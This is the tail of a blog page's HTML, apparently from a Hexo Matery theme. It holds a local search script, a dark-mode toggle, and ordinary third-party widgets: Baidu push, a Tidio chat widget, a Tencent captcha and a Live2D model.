        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 白天和黑夜主题 -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
    
    
        
        <script type="text/javascript">
            // 只在桌面版网页启用特效
            var windowWidth = $(window).width();
            if (windowWidth > 768) {
                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
            }
        </script>
    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    
        <script src="//code.tidio.co/7sfvbaabl5mp7up6avakdatk7dbm4xow.js"></script>
        <script>
            $(document).ready(function () {
                setInterval(change_Tidio, 50);
                function change_Tidio() {
                    var tidio=$("#tidio-chat iframe");
                    if(tidio.css("display")=="block"&& $(window).width()>977 ){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" &&$(window).width()>977)>0? "-40px" : ($("div.toc-title").length&&$(window).width()>977)>0?"85px":"20px";
                        document.getElementById("tidio-chat-iframe").style.right="-15px";
                        document.getElementById("tidio-chat-iframe").style.height=parseInt(tidio.css("height"))>=520?"520px":tidio.css("height");
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    else if(tidio.css("display")=="block"&&$(window).width()>601 &&$(window).width()<992 ){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && 601< $(window).width()<992)>0? "-40px":"20px" ;
                        document.getElementById("tidio-chat-iframe").style.right="-15px";
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    else if(tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))<230){
                        document.getElementById("tidio-chat-iframe").style.bottom= ($("div#backTop.top-scroll").css("display")=="none" && $(window).width()<601)>0? "-10px":"45px" ;
                        document.getElementById("tidio-chat-iframe").style.zIndex="997";
                    }
                    if( tidio.css("display")=="block"&&$(window).width()<601 && parseInt(tidio.css("height"))>=230){
                        document.getElementById("tidio-chat-iframe").style.zIndex="998";
                    }
                }
            });
        </script>
    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>
